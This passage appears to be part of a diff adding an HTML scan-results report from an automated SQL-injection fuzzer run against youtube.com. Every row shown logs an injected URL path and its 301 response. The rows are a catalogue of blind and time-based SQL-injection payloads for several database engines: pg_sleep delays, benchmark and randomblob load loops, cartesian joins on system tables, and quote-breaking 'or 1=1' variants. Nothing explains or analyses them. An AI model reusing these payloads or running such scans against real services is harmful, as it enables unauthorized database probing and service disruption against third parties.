+				<tr class="result-301" style="background-color: #bbbbe6;"><td><font color="black" class="status-code">301</font></td><td>(select&#43;like(&#39;abcdefg&#39;,upper(hex(randomblob(150000000)))))&#43;as&#43;test</td></td><td>https://youtube.com/(select&#43;like(&#39;abcdefg&#39;,upper(hex(randomblob(150000000)))))&#43;as&#43;test</td><td>https://www.youtube.com/(select&#43;like(&#39;abcdefg&#39;,upper(hex(randomblob(150000000)))))&#43;as&#43;test</td><td>10</td><td>0</td><td>1</td><td>1</td><td></td></tr>
+            
+                <div style="display:none">
+|result_raw|301|(select&#43;count(*)&#43;from&#43;all_users&#43;t1,all_users&#43;t2,all_users&#43;t3,all_users&#43;t4,all_users&#43;t5)&#43;as&#43;test|https://youtube.com/(select&#43;count(*)&#43;from&#43;all_users&#43;t1,all_users&#43;t2,all_users&#43;t3,all_users&#43;t4,all_users&#43;t5)&#43;as&#43;test|https://www.youtube.com/(select&#43;count(*)&#43;from&#43;all_users&#43;t1,all_users&#43;t2,all_users&#43;t3,all_users&#43;t4,all_users&#43;t5)&#43;as&#43;test|14|0|1|1|
+                </div>
+				<tr class="result-301" style="background-color: #bbbbe6;"><td><font color="black" class="status-code">301</font></td><td>(select&#43;count(*)&#43;from&#43;all_users&#43;t1,all_users&#43;t2,all_users&#43;t3,all_users&#43;t4,all_users&#43;t5)&#43;as&#43;test</td></td><td>https://youtube.com/(select&#43;count(*)&#43;from&#43;all_users&#43;t1,all_users&#43;t2,all_users&#43;t3,all_users&#43;t4,all_users&#43;t5)&#43;as&#43;test</td><td>https://www.youtube.com/(select&#43;count(*)&#43;from&#43;all_users&#43;t1,all_users&#43;t2,all_users&#43;t3,all_users&#43;t4,all_users&#43;t5)&#43;as&#43;test</td><td>14</td><td>0</td><td>1</td><td>1</td><td></td></tr>
+            
+                <div style="display:none">
+|result_raw|301|9999&#34;||(select&#43;count(*)&#43;from&#43;INFORMATION_SCHEMA.tables&#43;as&#43;sys1,INFORMATION_SCHEMA.tables&#43;as&#43;sys2,INFORMATION_SCHEMA.tables&#43;as&#43;sys3,INFORMATION_SCHEMA.tables&#43;as&#43;sys4,INFORMATION_SCHEMA.tables&#43;as&#43;sys5,INFORMATION_SCHEMA.tables&#43;as&#43;sys6)||&#34;9999|https://youtube.com/9999&#34;||(select&#43;count(*)&#43;from&#43;INFORMATION_SCHEMA.tables&#43;as&#43;sys1,INFORMATION_SCHEMA.tables&#43;as&#43;sys2,INFORMATION_SCHEMA.tables&#43;as&#43;sys3,INFORMATION_SCHEMA.tables&#43;as&#43;sys4,INFORMATION_SCHEMA.tables&#43;as&#43;sys5,INFORMATION_SCHEMA.tables&#43;as&#43;sys6)||&#34;9999|https://www.youtube.com/9999%22%7C%7C(select&#43;count(*)&#43;from&#43;INFORMATION_SCHEMA.tables&#43;as&#43;sys1,INFORMATION_SCHEMA.tables&#43;as&#43;sys2,INFORMATION_SCHEMA.tables&#43;as&#43;sys3,INFORMATION_SCHEMA.tables&#43;as&#43;sys4,INFORMATION_SCHEMA.tables&#43;as&#43;sys5,INFORMATION_SCHEMA.tables&#43;as&#43;sys6)%7C%7C%229999|9|0|1|1|
+                </div>
+				<tr class="result-301" style="background-color: #bbbbe6;"><td><font color="black" class="status-code">301</font></td><td>9999&#34;||(select&#43;count(*)&#43;from&#43;INFORMATION_SCHEMA.tables&#43;as&#43;sys1,INFORMATION_SCHEMA.tables&#43;as&#43;sys2,INFORMATION_SCHEMA.tables&#43;as&#43;sys3,INFORMATION_SCHEMA.tables&#43;as&#43;sys4,INFORMATION_SCHEMA.tables&#43;as&#43;sys5,INFORMATION_SCHEMA.tables&#43;as&#43;sys6)||&#34;9999</td></td><td>https://youtube.com/9999&#34;||(select&#43;count(*)&#43;from&#43;INFORMATION_SCHEMA.tables&#43;as&#43;sys1,INFORMATION_SCHEMA.tables&#43;as&#43;sys2,INFORMATION_SCHEMA.tables&#43;as&#43;sys3,INFORMATION_SCHEMA.tables&#43;as&#43;sys4,INFORMATION_SCHEMA.tables&#43;as&#43;sys5,INFORMATION_SCHEMA.tables&#43;as&#43;sys6)||&#34;9999</td><td>https://www.youtube.com/9999%22%7C%7C(select&#43;count(*)&#43;from&#43;INFORMATION_SCHEMA.tables&#43;as&#43;sys1,INFORMATION_SCHEMA.tables&#43;as&#43;sys2,INFORMATION_SCHEMA.tables&#43;as&#43;sys3,INFORMATION_SCHEMA.tables&#43;as&#43;sys4,INFORMATION_SCHEMA.tables&#43;as&#43;sys5,INFORMATION_SCHEMA.tables&#43;as&#43;sys6)%7C%7C%229999</td><td>9</td><td>0</td><td>1</td><td>1</td><td></td></tr>
+            
+                <div style="display:none">
+|result_raw|301|(select&#43;count(*)&#43;from&#43;sysibm.systables&#43;as&#43;t1,sysibm.systables&#43;as&#43;t2,sysibm.systables&#43;as&#43;t3)&#43;as&#43;test|https://youtube.com/(select&#43;count(*)&#43;from&#43;sysibm.systables&#43;as&#43;t1,sysibm.systables&#43;as&#43;t2,sysibm.systables&#43;as&#43;t3)&#43;as&#43;test|https://www.youtube.com/(select&#43;count(*)&#43;from&#43;sysibm.systables&#43;as&#43;t1,sysibm.systables&#43;as&#43;t2,sysibm.systables&#43;as&#43;t3)&#43;as&#43;test|34|0|1|1|
+                </div>
+				<tr class="result-301" style="background-color: #bbbbe6;"><td><font color="black" class="status-code">301</font></td><td>(select&#43;count(*)&#43;from&#43;sysibm.systables&#43;as&#43;t1,sysibm.systables&#43;as&#43;t2,sysibm.systables&#43;as&#43;t3)&#43;as&#43;test</td></td><td>https://youtube.com/(select&#43;count(*)&#43;from&#43;sysibm.systables&#43;as&#43;t1,sysibm.systables&#43;as&#43;t2,sysibm.systables&#43;as&#43;t3)&#43;as&#43;test</td><td>https://www.youtube.com/(select&#43;count(*)&#43;from&#43;sysibm.systables&#43;as&#43;t1,sysibm.systables&#43;as&#43;t2,sysibm.systables&#43;as&#43;t3)&#43;as&#43;test</td><td>34</td><td>0</td><td>1</td><td>1</td><td></td></tr>
+            
+                <div style="display:none">
+|result_raw|301|9999&#34;||(select&#43;99999999&#43;from&#43;pg_sleep(15))||&#34;9999|https://youtube.com/9999&#34;||(select&#43;99999999&#43;from&#43;pg_sleep(15))||&#34;9999|https://www.youtube.com/9999%22%7C%7C(select&#43;99999999&#43;from&#43;pg_sleep(15))%7C%7C%229999|41|0|1|1|
+                </div>
+				<tr class="result-301" style="background-color: #bbbbe6;"><td><font color="black" class="status-code">301</font></td><td>9999&#34;||(select&#43;99999999&#43;from&#43;pg_sleep(15))||&#34;9999</td></td><td>https://youtube.com/9999&#34;||(select&#43;99999999&#43;from&#43;pg_sleep(15))||&#34;9999</td><td>https://www.youtube.com/9999%22%7C%7C(select&#43;99999999&#43;from&#43;pg_sleep(15))%7C%7C%229999</td><td>41</td><td>0</td><td>1</td><td>1</td><td></td></tr>
+            
+                <div style="display:none">
+|result_raw|301|(select&#43;count(*)&#43;from&#43;all_users&#43;t1,all_users&#43;t2,all_users&#43;t3,all_users&#43;t4,all_users&#43;t5)|https://youtube.com/(select&#43;count(*)&#43;from&#43;all_users&#43;t1,all_users&#43;t2,all_users&#43;t3,all_users&#43;t4,all_users&#43;t5)|https://www.youtube.com/(select&#43;count(*)&#43;from&#43;all_users&#43;t1,all_users&#43;t2,all_users&#43;t3,all_users&#43;t4,all_users&#43;t5)|15|0|1|1|
+                </div>
+				<tr class="result-301" style="background-color: #bbbbe6;"><td><font color="black" class="status-code">301</font></td><td>(select&#43;count(*)&#43;from&#43;all_users&#43;t1,all_users&#43;t2,all_users&#43;t3,all_users&#43;t4,all_users&#43;t5)</td></td><td>https://youtube.com/(select&#43;count(*)&#43;from&#43;all_users&#43;t1,all_users&#43;t2,all_users&#43;t3,all_users&#43;t4,all_users&#43;t5)</td><td>https://www.youtube.com/(select&#43;count(*)&#43;from&#43;all_users&#43;t1,all_users&#43;t2,all_users&#43;t3,all_users&#43;t4,all_users&#43;t5)</td><td>15</td><td>0</td><td>1</td><td>1</td><td></td></tr>
+            
+                <div style="display:none">
+|result_raw|301|(select&#43;like(&#39;abcdefg&#39;,upper(hex(randomblob(150000000)))))|https://youtube.com/(select&#43;like(&#39;abcdefg&#39;,upper(hex(randomblob(150000000)))))|https://www.youtube.com/(select&#43;like(&#39;abcdefg&#39;,upper(hex(randomblob(150000000)))))|11|0|1|1|
+                </div>
+				<tr class="result-301" style="background-color: #bbbbe6;"><td><font color="black" class="status-code">301</font></td><td>(select&#43;like(&#39;abcdefg&#39;,upper(hex(randomblob(150000000)))))</td></td><td>https://youtube.com/(select&#43;like(&#39;abcdefg&#39;,upper(hex(randomblob(150000000)))))</td><td>https://www.youtube.com/(select&#43;like(&#39;abcdefg&#39;,upper(hex(randomblob(150000000)))))</td><td>11</td><td>0</td><td>1</td><td>1</td><td></td></tr>
+            
+                <div style="display:none">
+|result_raw|301|9999&#39;||(select&#43;count(*)&#43;from&#43;all_users&#43;t1,all_users&#43;t2,all_users&#43;t3,all_users&#43;t4,all_users&#43;t5)||&#39;9999|https://youtube.com/9999&#39;||(select&#43;count(*)&#43;from&#43;all_users&#43;t1,all_users&#43;t2,all_users&#43;t3,all_users&#43;t4,all_users&#43;t5)||&#39;9999|https://www.youtube.com/9999&#39;%7C%7C(select&#43;count(*)&#43;from&#43;all_users&#43;t1,all_users&#43;t2,all_users&#43;t3,all_users&#43;t4,all_users&#43;t5)%7C%7C&#39;9999|16|0|1|1|
+                </div>
+				<tr class="result-301" style="background-color: #bbbbe6;"><td><font color="black" class="status-code">301</font></td><td>9999&#39;||(select&#43;count(*)&#43;from&#43;all_users&#43;t1,all_users&#43;t2,all_users&#43;t3,all_users&#43;t4,all_users&#43;t5)||&#39;9999</td></td><td>https://youtube.com/9999&#39;||(select&#43;count(*)&#43;from&#43;all_users&#43;t1,all_users&#43;t2,all_users&#43;t3,all_users&#43;t4,all_users&#43;t5)||&#39;9999</td><td>https://www.youtube.com/9999&#39;%7C%7C(select&#43;count(*)&#43;from&#43;all_users&#43;t1,all_users&#43;t2,all_users&#43;t3,all_users&#43;t4,all_users&#43;t5)%7C%7C&#39;9999</td><td>16</td><td>0</td><td>1</td><td>1</td><td></td></tr>
+            
+                <div style="display:none">
+|result_raw|301|(select&#43;count(*)&#43;from&#43;sysusers&#43;as&#43;sys1,sysusers&#43;as&#43;sys2,sysusers&#43;as&#43;sys3,sysusers&#43;as&#43;sys4,sysusers&#43;as&#43;sys5,sysusers&#43;as&#43;sys6,sysusers&#43;as&#43;sys7)&#43;as&#43;test|https://youtube.com/(select&#43;count(*)&#43;from&#43;sysusers&#43;as&#43;sys1,sysusers&#43;as&#43;sys2,sysusers&#43;as&#43;sys3,sysusers&#43;as&#43;sys4,sysusers&#43;as&#43;sys5,sysusers&#43;as&#43;sys6,sysusers&#43;as&#43;sys7)&#43;as&#43;test|https://www.youtube.com/(select&#43;count(*)&#43;from&#43;sysusers&#43;as&#43;sys1,sysusers&#43;as&#43;sys2,sysusers&#43;as&#43;sys3,sysusers&#43;as&#43;sys4,sysusers&#43;as&#43;sys5,sysusers&#43;as&#43;sys6,sysusers&#43;as&#43;sys7)&#43;as&#43;test|22|0|1|1|
+                </div>
+				<tr class="result-301" style="background-color: #bbbbe6;"><td><font color="black" class="status-code">301</font></td><td>(select&#43;count(*)&#43;from&#43;sysusers&#43;as&#43;sys1,sysusers&#43;as&#43;sys2,sysusers&#43;as&#43;sys3,sysusers&#43;as&#43;sys4,sysusers&#43;as&#43;sys5,sysusers&#43;as&#43;sys6,sysusers&#43;as&#43;sys7)&#43;as&#43;test</td></td><td>https://youtube.com/(select&#43;count(*)&#43;from&#43;sysusers&#43;as&#43;sys1,sysusers&#43;as&#43;sys2,sysusers&#43;as&#43;sys3,sysusers&#43;as&#43;sys4,sysusers&#43;as&#43;sys5,sysusers&#43;as&#43;sys6,sysusers&#43;as&#43;sys7)&#43;as&#43;test</td><td>https://www.youtube.com/(select&#43;count(*)&#43;from&#43;sysusers&#43;as&#43;sys1,sysusers&#43;as&#43;sys2,sysusers&#43;as&#43;sys3,sysusers&#43;as&#43;sys4,sysusers&#43;as&#43;sys5,sysusers&#43;as&#43;sys6,sysusers&#43;as&#43;sys7)&#43;as&#43;test</td><td>22</td><td>0</td><td>1</td><td>1</td><td></td></tr>
+            
+                <div style="display:none">
+|result_raw|301|9999&#34;||(select&#43;count(*)&#43;from&#43;all_users&#43;t1,all_users&#43;t2,all_users&#43;t3,all_users&#43;t4,all_users&#43;t5)||&#34;9999|https://youtube.com/9999&#34;||(select&#43;count(*)&#43;from&#43;all_users&#43;t1,all_users&#43;t2,all_users&#43;t3,all_users&#43;t4,all_users&#43;t5)||&#34;9999|https://www.youtube.com/9999%22%7C%7C(select&#43;count(*)&#43;from&#43;all_users&#43;t1,all_users&#43;t2,all_users&#43;t3,all_users&#43;t4,all_users&#43;t5)%7C%7C%229999|17|0|1|1|
+                </div>
+				<tr class="result-301" style="background-color: #bbbbe6;"><td><font color="black" class="status-code">301</font></td><td>9999&#34;||(select&#43;count(*)&#43;from&#43;all_users&#43;t1,all_users&#43;t2,all_users&#43;t3,all_users&#43;t4,all_users&#43;t5)||&#34;9999</td></td><td>https://youtube.com/9999&#34;||(select&#43;count(*)&#43;from&#43;all_users&#43;t1,all_users&#43;t2,all_users&#43;t3,all_users&#43;t4,all_users&#43;t5)||&#34;9999</td><td>https://www.youtube.com/9999%22%7C%7C(select&#43;count(*)&#43;from&#43;all_users&#43;t1,all_users&#43;t2,all_users&#43;t3,all_users&#43;t4,all_users&#43;t5)%7C%7C%229999</td><td>17</td><td>0</td><td>1</td><td>1</td><td></td></tr>
+            
+                <div style="display:none">
+|result_raw|301|(select&#43;count(*)&#43;from&#43;rdb$fields&#43;as&#43;t1,rdb$types&#43;as&#43;t2,rdb$collations&#43;as&#43;t3)&#43;as&#43;test|https://youtube.com/(select&#43;count(*)&#43;from&#43;rdb$fields&#43;as&#43;t1,rdb$types&#43;as&#43;t2,rdb$collations&#43;as&#43;t3)&#43;as&#43;test|https://www.youtube.com/(select&#43;count(*)&#43;from&#43;rdb$fields&#43;as&#43;t1,rdb$types&#43;as&#43;t2,rdb$collations&#43;as&#43;t3)&#43;as&#43;test|30|0|1|1|
+                </div>
+				<tr class="result-301" style="background-color: #bbbbe6;"><td><font color="black" class="status-code">301</font></td><td>(select&#43;count(*)&#43;from&#43;rdb$fields&#43;as&#43;t1,rdb$types&#43;as&#43;t2,rdb$collations&#43;as&#43;t3)&#43;as&#43;test</td></td><td>https://youtube.com/(select&#43;count(*)&#43;from&#43;rdb$fields&#43;as&#43;t1,rdb$types&#43;as&#43;t2,rdb$collations&#43;as&#43;t3)&#43;as&#43;test</td><td>https://www.youtube.com/(select&#43;count(*)&#43;from&#43;rdb$fields&#43;as&#43;t1,rdb$types&#43;as&#43;t2,rdb$collations&#43;as&#43;t3)&#43;as&#43;test</td><td>30</td><td>0</td><td>1</td><td>1</td><td></td></tr>
+            
+                <div style="display:none">
+|result_raw|301|(select&#43;count(*)&#43;from&#43;domain.domains&#43;as&#43;t1,domain.columns&#43;as&#43;t2,domain.tables&#43;as&#43;t3)&#43;as&#43;test|https://youtube.com/(select&#43;count(*)&#43;from&#43;domain.domains&#43;as&#43;t1,domain.columns&#43;as&#43;t2,domain.tables&#43;as&#43;t3)&#43;as&#43;test|https://www.youtube.com/(select&#43;count(*)&#43;from&#43;domain.domains&#43;as&#43;t1,domain.columns&#43;as&#43;t2,domain.tables&#43;as&#43;t3)&#43;as&#43;test|26|0|1|1|
+                </div>
+				<tr class="result-301" style="background-color: #bbbbe6;"><td><font color="black" class="status-code">301</font></td><td>(select&#43;count(*)&#43;from&#43;domain.domains&#43;as&#43;t1,domain.columns&#43;as&#43;t2,domain.tables&#43;as&#43;t3)&#43;as&#43;test</td></td><td>https://youtube.com/(select&#43;count(*)&#43;from&#43;domain.domains&#43;as&#43;t1,domain.columns&#43;as&#43;t2,domain.tables&#43;as&#43;t3)&#43;as&#43;test</td><td>https://www.youtube.com/(select&#43;count(*)&#43;from&#43;domain.domains&#43;as&#43;t1,domain.columns&#43;as&#43;t2,domain.tables&#43;as&#43;t3)&#43;as&#43;test</td><td>26</td><td>0</td><td>1</td><td>1</td><td></td></tr>
+            
+                <div style="display:none">
+|result_raw|301|benchmark(15000000,md5(0x4e446b6e))-9999|https://youtube.com/benchmark(15000000,md5(0x4e446b6e))-9999|https://www.youtube.com/benchmark(15000000,md5(0x4e446b6e))-9999|19|0|1|1|
+                </div>
+				<tr class="result-301" style="background-color: #bbbbe6;"><td><font color="black" class="status-code">301</font></td><td>benchmark(15000000,md5(0x4e446b6e))-9999</td></td><td>https://youtube.com/benchmark(15000000,md5(0x4e446b6e))-9999</td><td>https://www.youtube.com/benchmark(15000000,md5(0x4e446b6e))-9999</td><td>19</td><td>0</td><td>1</td><td>1</td><td></td></tr>
+            
+                <div style="display:none">
+|result_raw|301|(select&#43;count(*)&#43;from&#43;rdb$fields&#43;as&#43;t1,rdb$types&#43;as&#43;t2,rdb$collations&#43;as&#43;t3)|https://youtube.com/(select&#43;count(*)&#43;from&#43;rdb$fields&#43;as&#43;t1,rdb$types&#43;as&#43;t2,rdb$collations&#43;as&#43;t3)|https://www.youtube.com/(select&#43;count(*)&#43;from&#43;rdb$fields&#43;as&#43;t1,rdb$types&#43;as&#43;t2,rdb$collations&#43;as&#43;t3)|31|0|1|1|
+                </div>
+				<tr class="result-301" style="background-color: #bbbbe6;"><td><font color="black" class="status-code">301</font></td><td>(select&#43;count(*)&#43;from&#43;rdb$fields&#43;as&#43;t1,rdb$types&#43;as&#43;t2,rdb$collations&#43;as&#43;t3)</td></td><td>https://youtube.com/(select&#43;count(*)&#43;from&#43;rdb$fields&#43;as&#43;t1,rdb$types&#43;as&#43;t2,rdb$collations&#43;as&#43;t3)</td><td>https://www.youtube.com/(select&#43;count(*)&#43;from&#43;rdb$fields&#43;as&#43;t1,rdb$types&#43;as&#43;t2,rdb$collations&#43;as&#43;t3)</td><td>31</td><td>0</td><td>1</td><td>1</td><td></td></tr>
+            
+                <div style="display:none">
+|result_raw|301|(select&#43;count(*)&#43;from&#43;sysusers&#43;as&#43;sys1,sysusers&#43;as&#43;sys2,sysusers&#43;as&#43;sys3,sysusers&#43;as&#43;sys4,sysusers&#43;as&#43;sys5,sysusers&#43;as&#43;sys6,sysusers&#43;as&#43;sys7)|https://youtube.com/(select&#43;count(*)&#43;from&#43;sysusers&#43;as&#43;sys1,sysusers&#43;as&#43;sys2,sysusers&#43;as&#43;sys3,sysusers&#43;as&#43;sys4,sysusers&#43;as&#43;sys5,sysusers&#43;as&#43;sys6,sysusers&#43;as&#43;sys7)|https://www.youtube.com/(select&#43;count(*)&#43;from&#43;sysusers&#43;as&#43;sys1,sysusers&#43;as&#43;sys2,sysusers&#43;as&#43;sys3,sysusers&#43;as&#43;sys4,sysusers&#43;as&#43;sys5,sysusers&#43;as&#43;sys6,sysusers&#43;as&#43;sys7)|23|0|1|1|
+                </div>
+				<tr class="result-301" style="background-color: #bbbbe6;"><td><font color="black" class="status-code">301</font></td><td>(select&#43;count(*)&#43;from&#43;sysusers&#43;as&#43;sys1,sysusers&#43;as&#43;sys2,sysusers&#43;as&#43;sys3,sysusers&#43;as&#43;sys4,sysusers&#43;as&#43;sys5,sysusers&#43;as&#43;sys6,sysusers&#43;as&#43;sys7)</td></td><td>https://youtube.com/(select&#43;count(*)&#43;from&#43;sysusers&#43;as&#43;sys1,sysusers&#43;as&#43;sys2,sysusers&#43;as&#43;sys3,sysusers&#43;as&#43;sys4,sysusers&#43;as&#43;sys5,sysusers&#43;as&#43;sys6,sysusers&#43;as&#43;sys7)</td><td>https://www.youtube.com/(select&#43;count(*)&#43;from&#43;sysusers&#43;as&#43;sys1,sysusers&#43;as&#43;sys2,sysusers&#43;as&#43;sys3,sysusers&#43;as&#43;sys4,sysusers&#43;as&#43;sys5,sysusers&#43;as&#43;sys6,sysusers&#43;as&#43;sys7)</td><td>23</td><td>0</td><td>1</td><td>1</td><td></td></tr>
+            
+                <div style="display:none">
+|result_raw|301|(select&#43;benchmark(15000000,md5(0x4e446b6e))-9999)&#43;as&#43;test|https://youtube.com/(select&#43;benchmark(15000000,md5(0x4e446b6e))-9999)&#43;as&#43;test|https://www.youtube.com/(select&#43;benchmark(15000000,md5(0x4e446b6e))-9999)&#43;as&#43;test|18|0|1|1|
+                </div>
+				<tr class="result-301" style="background-color: #bbbbe6;"><td><font color="black" class="status-code">301</font></td><td>(select&#43;benchmark(15000000,md5(0x4e446b6e))-9999)&#43;as&#43;test</td></td><td>https://youtube.com/(select&#43;benchmark(15000000,md5(0x4e446b6e))-9999)&#43;as&#43;test</td><td>https://www.youtube.com/(select&#43;benchmark(15000000,md5(0x4e446b6e))-9999)&#43;as&#43;test</td><td>18</td><td>0</td><td>1</td><td>1</td><td></td></tr>
+            
+                <div style="display:none">
+|result_raw|301|(select&#43;99999999&#43;from&#43;pg_sleep(15))&#43;as&#43;test|https://youtube.com/(select&#43;99999999&#43;from&#43;pg_sleep(15))&#43;as&#43;test|https://www.youtube.com/(select&#43;99999999&#43;from&#43;pg_sleep(15))&#43;as&#43;test|38|0|1|1|
+                </div>
+				<tr class="result-301" style="background-color: #bbbbe6;"><td><font color="black" class="status-code">301</font></td><td>(select&#43;99999999&#43;from&#43;pg_sleep(15))&#43;as&#43;test</td></td><td>https://youtube.com/(select&#43;99999999&#43;from&#43;pg_sleep(15))&#43;as&#43;test</td><td>https://www.youtube.com/(select&#43;99999999&#43;from&#43;pg_sleep(15))&#43;as&#43;test</td><td>38</td><td>0</td><td>1</td><td>1</td><td></td></tr>
+            
+                <div style="display:none">
+|result_raw|301|9999&#34;||(select&#43;count(*)&#43;from&#43;sysibm.systables&#43;as&#43;t1,sysibm.systables&#43;as&#43;t2,sysibm.systables&#43;as&#43;t3)||&#34;9999|https://youtube.com/9999&#34;||(select&#43;count(*)&#43;from&#43;sysibm.systables&#43;as&#43;t1,sysibm.systables&#43;as&#43;t2,sysibm.systables&#43;as&#43;t3)||&#34;9999|https://www.youtube.com/9999%22%7C%7C(select&#43;count(*)&#43;from&#43;sysibm.systables&#43;as&#43;t1,sysibm.systables&#43;as&#43;t2,sysibm.systables&#43;as&#43;t3)%7C%7C%229999|37|0|1|1|
+                </div>
+				<tr class="result-301" style="background-color: #bbbbe6;"><td><font color="black" class="status-code">301</font></td><td>9999&#34;||(select&#43;count(*)&#43;from&#43;sysibm.systables&#43;as&#43;t1,sysibm.systables&#43;as&#43;t2,sysibm.systables&#43;as&#43;t3)||&#34;9999</td></td><td>https://youtube.com/9999&#34;||(select&#43;count(*)&#43;from&#43;sysibm.systables&#43;as&#43;t1,sysibm.systables&#43;as&#43;t2,sysibm.systables&#43;as&#43;t3)||&#34;9999</td><td>https://www.youtube.com/9999%22%7C%7C(select&#43;count(*)&#43;from&#43;sysibm.systables&#43;as&#43;t1,sysibm.systables&#43;as&#43;t2,sysibm.systables&#43;as&#43;t3)%7C%7C%229999</td><td>37</td><td>0</td><td>1</td><td>1</td><td></td></tr>
+            
+                <div style="display:none">
+|result_raw|301|(select&#43;99999999&#43;from&#43;pg_sleep(15))|https://youtube.com/(select&#43;99999999&#43;from&#43;pg_sleep(15))|https://www.youtube.com/(select&#43;99999999&#43;from&#43;pg_sleep(15))|39|0|1|1|
+                </div>
+				<tr class="result-301" style="background-color: #bbbbe6;"><td><font color="black" class="status-code">301</font></td><td>(select&#43;99999999&#43;from&#43;pg_sleep(15))</td></td><td>https://youtube.com/(select&#43;99999999&#43;from&#43;pg_sleep(15))</td><td>https://www.youtube.com/(select&#43;99999999&#43;from&#43;pg_sleep(15))</td><td>39</td><td>0</td><td>1</td><td>1</td><td></td></tr>
+            
+                <div style="display:none">
+|result_raw|301|1&#43;or&#43;(select&#43;count(*)&#43;from&#43;INFORMATION_SCHEMA.tables&#43;as&#43;sys1,INFORMATION_SCHEMA.tables&#43;as&#43;sys2,INFORMATION_SCHEMA.tables&#43;as&#43;sys3,INFORMATION_SCHEMA.tables&#43;as&#43;sys4,INFORMATION_SCHEMA.tables&#43;as&#43;sys5,INFORMATION_SCHEMA.tables&#43;as&#43;sys6)=0&#43;or&#43;1=1|https://youtube.com/1&#43;or&#43;(select&#43;count(*)&#43;from&#43;INFORMATION_SCHEMA.tables&#43;as&#43;sys1,INFORMATION_SCHEMA.tables&#43;as&#43;sys2,INFORMATION_SCHEMA.tables&#43;as&#43;sys3,INFORMATION_SCHEMA.tables&#43;as&#43;sys4,INFORMATION_SCHEMA.tables&#43;as&#43;sys5,INFORMATION_SCHEMA.tables&#43;as&#43;sys6)=0&#43;or&#43;1=1|https://www.youtube.com/1&#43;or&#43;(select&#43;count(*)&#43;from&#43;INFORMATION_SCHEMA.tables&#43;as&#43;sys1,INFORMATION_SCHEMA.tables&#43;as&#43;sys2,INFORMATION_SCHEMA.tables&#43;as&#43;sys3,INFORMATION_SCHEMA.tables&#43;as&#43;sys4,INFORMATION_SCHEMA.tables&#43;as&#43;sys5,INFORMATION_SCHEMA.tables&#43;as&#43;sys6)=0&#43;or&#43;1=1|1|0|1|1|
+                </div>
+				<tr class="result-301" style="background-color: #bbbbe6;"><td><font color="black" class="status-code">301</font></td><td>1&#43;or&#43;(select&#43;count(*)&#43;from&#43;INFORMATION_SCHEMA.tables&#43;as&#43;sys1,INFORMATION_SCHEMA.tables&#43;as&#43;sys2,INFORMATION_SCHEMA.tables&#43;as&#43;sys3,INFORMATION_SCHEMA.tables&#43;as&#43;sys4,INFORMATION_SCHEMA.tables&#43;as&#43;sys5,INFORMATION_SCHEMA.tables&#43;as&#43;sys6)=0&#43;or&#43;1=1</td></td><td>https://youtube.com/1&#43;or&#43;(select&#43;count(*)&#43;from&#43;INFORMATION_SCHEMA.tables&#43;as&#43;sys1,INFORMATION_SCHEMA.tables&#43;as&#43;sys2,INFORMATION_SCHEMA.tables&#43;as&#43;sys3,INFORMATION_SCHEMA.tables&#43;as&#43;sys4,INFORMATION_SCHEMA.tables&#43;as&#43;sys5,INFORMATION_SCHEMA.tables&#43;as&#43;sys6)=0&#43;or&#43;1=1</td><td>https://www.youtube.com/1&#43;or&#43;(select&#43;count(*)&#43;from&#43;INFORMATION_SCHEMA.tables&#43;as&#43;sys1,INFORMATION_SCHEMA.tables&#43;as&#43;sys2,INFORMATION_SCHEMA.tables&#43;as&#43;sys3,INFORMATION_SCHEMA.tables&#43;as&#43;sys4,INFORMATION_SCHEMA.tables&#43;as&#43;sys5,INFORMATION_SCHEMA.tables&#43;as&#43;sys6)=0&#43;or&#43;1=1</td><td>1</td><td>0</td><td>1</td><td>1</td><td></td></tr>
+            
+                <div style="display:none">
+|result_raw|301|9999&#34;&#43;or&#43;(select&#43;count(*)&#43;from&#43;INFORMATION_SCHEMA.tables&#43;as&#43;sys1,INFORMATION_SCHEMA.tables&#43;as&#43;sys2,INFORMATION_SCHEMA.tables&#43;as&#43;sys3,INFORMATION_SCHEMA.tables&#43;as&#43;sys4,INFORMATION_SCHEMA.tables&#43;as&#43;sys5,INFORMATION_SCHEMA.tables&#43;as&#43;sys6)=0&#43;or&#43;&#34;0&#34;=&#34;9999|https://youtube.com/9999&#34;&#43;or&#43;(select&#43;count(*)&#43;from&#43;INFORMATION_SCHEMA.tables&#43;as&#43;sys1,INFORMATION_SCHEMA.tables&#43;as&#43;sys2,INFORMATION_SCHEMA.tables&#43;as&#43;sys3,INFORMATION_SCHEMA.tables&#43;as&#43;sys4,INFORMATION_SCHEMA.tables&#43;as&#43;sys5,INFORMATION_SCHEMA.tables&#43;as&#43;sys6)=0&#43;or&#43;&#34;0&#34;=&#34;9999|https://www.youtube.com/9999%22&#43;or&#43;(select&#43;count(*)&#43;from&#43;INFORMATION_SCHEMA.tables&#43;as&#43;sys1,INFORMATION_SCHEMA.tables&#43;as&#43;sys2,INFORMATION_SCHEMA.tables&#43;as&#43;sys3,INFORMATION_SCHEMA.tables&#43;as&#43;sys4,INFORMATION_SCHEMA.tables&#43;as&#43;sys5,INFORMATION_SCHEMA.tables&#43;as&#43;sys6)=0&#43;or&#43;%220%22=%229999|5|0|1|1|
+                </div>
+				<tr class="result-301" style="background-color: #bbbbe6;"><td><font color="black" class="status-code">301</font></td><td>9999&#34;&#43;or&#43;(select&#43;count(*)&#43;from&#43;INFORMATION_SCHEMA.tables&#43;as&#43;sys1,INFORMATION_SCHEMA.tables&#43;as&#43;sys2,INFORMATION_SCHEMA.tables&#43;as&#43;sys3,INFORMATION_SCHEMA.tables&#43;as&#43;sys4,INFORMATION_SCHEMA.tables&#43;as&#43;sys5,INFORMATION_SCHEMA.tables&#43;as&#43;sys6)=0&#43;or&#43;&#34;0&#34;=&#34;9999</td></td><td>https://youtube.com/9999&#34;&#43;or&#43;(select&#43;count(*)&#43;from&#43;INFORMATION_SCHEMA.tables&#43;as&#43;sys1,INFORMATION_SCHEMA.tables&#43;as&#43;sys2,INFORMATION_SCHEMA.tables&#43;as&#43;sys3,INFORMATION_SCHEMA.tables&#43;as&#43;sys4,INFORMATION_SCHEMA.tables&#43;as&#43;sys5,INFORMATION_SCHEMA.tables&#43;as&#43;sys6)=0&#43;or&#43;&#34;0&#34;=&#34;9999</td><td>https://www.youtube.com/9999%22&#43;or&#43;(select&#43;count(*)&#43;from&#43;INFORMATION_SCHEMA.tables&#43;as&#43;sys1,INFORMATION_SCHEMA.tables&#43;as&#43;sys2,INFORMATION_SCHEMA.tables&#43;as&#43;sys3,INFORMATION_SCHEMA.tables&#43;as&#43;sys4,INFORMATION_SCHEMA.tables&#43;as&#43;sys5,INFORMATION_SCHEMA.tables&#43;as&#43;sys6)=0&#43;or&#43;%220%22=%229999</td><td>5</td><td>0</td><td>1</td><td>1</td><